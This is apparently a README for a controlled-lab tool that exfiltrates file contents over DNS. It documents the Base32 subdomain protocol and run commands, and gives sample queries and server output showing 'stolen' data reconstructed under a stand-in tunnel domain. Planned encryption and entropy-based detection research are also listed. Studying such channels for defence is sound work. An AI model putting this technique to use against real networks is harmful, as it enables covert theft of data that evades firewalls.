# DNS Tunneling Prototype

A controlled-lab prototype demonstrating covert data exfiltration over the Domain Name System (DNS) protocol using Base32-encoded subdomains transmitted via standard UDP DNS queries.

## Overview

DNS is a core network protocol primarily designed to resolve human-readable domain names into IP addresses. Because DNS traffic is often permitted through strict perimeter firewalls without deep packet inspection, it represents a common vector for covert channels and data exfiltration.

This prototype demonstrates end-to-end data transmission by embedding encoded binary data into DNS query labels (subdomains). A custom non-recursive DNS server parses incoming queries, orders the received chunks, and reconstructs the original payload.

### Data Flow Architecture

```
┌─────────────┐     ┌────────────────┐     ┌────────────────┐     ┌───────────────┐
│ Input File  │ ──> │ Read Raw Bytes │ ──> │ Base32 Encode  │ ──> │ Split Chunks  │
└─────────────┘     └────────────────┘     └────────────────┘     └───────────────┘
                                                                          │
                                                                          ▼
┌─────────────┐     ┌────────────────┐     ┌────────────────┐     ┌───────────────┐
│ Original    │ <── │ Base32 Decode  │ <── │ Reorder Chunks │ <── │ DNS Query     │
│ File        │     │                │     │ (by Sequence)  │     │ Transmission  │
└─────────────┘     └────────────────┘     └────────────────┘     └───────────────┘
```

---

## Features

- **Raw Byte Processing:** Reads arbitrary binary or text files without encoding assumptions.
- **Base32 Protocol Encoding:** Encodes data into standard Base32 strings (RFC 4648) to maintain DNS character set compatibility (case-insensitive, alphanumeric).
- **Chunking & Sequence Management:** Splices long payloads into discrete, sized labels while prepending protocol metadata (`TOTAL_CHUNKS` and `SEQUENCE_NUMBER`).
- **UDP Socket Communication:** Transmits standard DNS `A` record queries using `dnspython`.
- **Server-Side Packet Parsing:** Extracts subdomains, parses sequence metadata, buffers out-of-order chunks, and decodes the completed payload.

---

## Protocol Specification

DNS query names follow a structured schema designed to convey state information alongside the payload chunk:

```text
<TOTAL_CHUNKS>.<SEQUENCE_NUMBER>.<DATA_CHUNK>.<BASE_DOMAIN>
```

### Protocol Fields

| Field | Description | Example |
| :--- | :--- | :--- |
| `TOTAL_CHUNKS` | Total number of fragments in the transmission session | `3` |
| `SEQUENCE_NUMBER` | 4-digit zero-padded index of the current fragment | `0001` |
| `DATA_CHUNK` | Base32-encoded payload fragment | `KRUGS4ZANFZSAU3FMNZG` |
| `BASE_DOMAIN` | Target domain assigned to the tunnel server | `tunnel.lab` |

### Example Query Sequence

```text
3.0001.KRUGS4ZANFZSAU3FMNZG.tunnel.lab
3.0002.K5BAKN2G63DFNYQGM4TP.tunnel.lab
3.0003.NUQHM2LDORUW2CQ.tunnel.lab
```

---

## Repository Structure

```text
DNS-Tunneling/
│
├── dns_client.py   # Client implementation for encoding and query transmission
├── dns_server.py   # Listener socket for parsing queries and payload reconstruction
├── test.txt        # Sample input payload file
└── README.md       # Project documentation
```

---

## Prerequisites & Installation

### Requirements
- **Python 3.8+**
- **dnspython** library

### Installation

Clone the repository and install dependencies:

```bash
git clone https://github.com/your-username/DNS-Tunneling.git
cd DNS-Tunneling
pip install dnspython
```

---

## Getting Started

### 1. Start the DNS Server Listener
Run the server script in your primary terminal window. By default, it binds to `127.0.0.1:5999`:

```bash
python dns_server.py
```

### 2. Run the Exfiltration Client
In a second terminal window, run the client script to read `test.txt` and begin exfiltration:

```bash
python dns_client.py
```

### Example Output

**Server Terminal Output:**

```text
[+] DNS Server initialized on 127.0.0.1:5999
[+] Listening for incoming queries...

[R] Received query: 3.0001.KRUGS4ZANFZSAU3FMNZG.tunnel.lab.
    └─ Sequence: 1/3 | Chunk Size: 20 bytes

[R] Received query: 3.0002.K5BAKN2G63DFNYQGM4TP.tunnel.lab.
    └─ Sequence: 2/3 | Chunk Size: 20 bytes

[R] Received query: 3.0003.NUQHM2LDORUW2CQ.tunnel.lab.
    └─ Sequence: 3/3 | Chunk Size: 15 bytes

[+] All 3 chunks successfully received.
[+] Reassembling payload...
[+] Base32 Decoding complete.

----------------------- RECONSTRUCTED PAYLOAD -----------------------
This is Secret Stolen from victim
---------------------------------------------------------------------
```

---

## Scope & Limitations

This repository is a **proof-of-concept (PoC)** intended strictly to demonstrate DNS query channel mechanics in isolated, controlled laboratory environments.

### Current Scope
- Standard UDP DNS query construction.
- Client-to-server unidirectional data transfer.
- Fixed chunk sizing and sequential reassembly.

### Out of Scope
- Advanced reliability features (ACK/NACK signals, sliding window retransmission).
- Bidirectional tunneling (using TXT or CNAME records for server responses).
- Operational obfuscation (encryption, noise injection, variable timing).
- Dynamic port switching or multi-client session handling.

---

## Technical Enhancements & Future Roadmap

- [ ] **Reliability:** Implement acknowledgment responses via DNS TXT records to handle dropped UDP packets.
- [ ] **Encryption:** Layer AES-GCM encryption over the payload prior to Base32 encoding.
- [ ] **Detection Research:** Integrate analytical tools to calculate Shannon Entropy on query labels and identify high-entropy DNS request anomalies.
- [ ] **Traffic Analysis Visualizer:** Build a dashboard to graph query frequency, packet sizes, and label length distributions against normal DNS baselines.

---

## Disclaimer

This project is created exclusively for educational purposes, security research, and defense analysis within authorized testing environments. Unauthorized deployment or testing against systems or networks without explicit permission from the system owner is strictly prohibited and violates applicable cybersecurity laws.